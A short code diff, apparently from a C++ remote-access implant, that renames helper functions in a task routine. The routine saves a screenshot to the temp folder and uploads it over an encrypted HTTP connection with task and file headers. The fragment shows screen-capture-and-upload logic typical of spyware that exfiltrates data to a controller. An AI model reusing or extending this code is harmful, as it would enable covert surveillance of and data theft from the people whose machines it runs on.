@@ -335,8 +335,8 @@ namespace Task
 {
     std::wstring Screenshot(State::PSTATE pState)
     {
-        wFilenameBmp = System::Env::GetStrings(pState->pProcs, L"%TEMP%") + L"\\tmp.bmp";
-        wFilenamePng = System::Env::GetStrings(pState->pProcs, L"%TEMP%") + L"\\tmp.png";
+        wFilenameBmp = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%") + L"\\tmp.bmp";
+        wFilenamePng = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%") + L"\\tmp.png";
 
         Task::Helper::Screenshot::MyRegisterClass(pState->hInstance);
 
@@ -364,7 +364,7 @@ namespace Task
         wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
         wHeaders += L"X-FILE: screenshot\r\n";
 
-        BOOL bResult = System::Http::UploadFile(
+        BOOL bResult = System::Http::FileUpload(
             pState->pProcs,
             pState->pCrypt,
             pState->hConnect,
